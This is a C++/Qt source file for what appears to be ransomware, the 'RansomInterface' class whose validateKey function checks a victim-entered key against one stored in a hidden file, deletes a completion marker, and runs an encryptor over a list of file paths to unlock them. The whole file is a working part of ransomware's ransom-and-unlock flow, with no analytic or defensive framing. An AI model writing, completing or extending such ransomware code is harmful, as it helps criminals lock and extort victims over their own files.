#include "RansomInterface.h"
#include "Encrypt.h"
#include <QFile>
#include <QDebug>
#include <QDir>
#include <QCoreApplication>

RansomInterface::RansomInterface(QObject *parent)
    : QObject(parent)
{}

void RansomInterface::validateKey(const QString &key) {
    qDebug() << "Entered key:" << key;

    // Read stored key from file
    QFile keyFile(".AhgsUcklasnd");
    QString storedKey;
    if (keyFile.open(QIODevice::ReadOnly | QIODevice::Text)) {
        storedKey = QString::fromUtf8(keyFile.readAll()).trimmed();
        keyFile.close();
    }

    if (!storedKey.isEmpty() && key == storedKey) {
        QFile doneFile(".done");
        if (doneFile.exists()) {
            if (doneFile.remove()) {
                qDebug() << ".done file deleted successfully.";
            } else {
                qDebug() << "Failed to delete .done file.";
            }
        }
        QString filePath = QCoreApplication::applicationDirPath() + QDir::separator() + "paths.txt";

        Encryptor enc;
        enc.encryptFromFile(filePath, "");

        emit unlock();
    } else {
        emit invalidKey();
    }
}
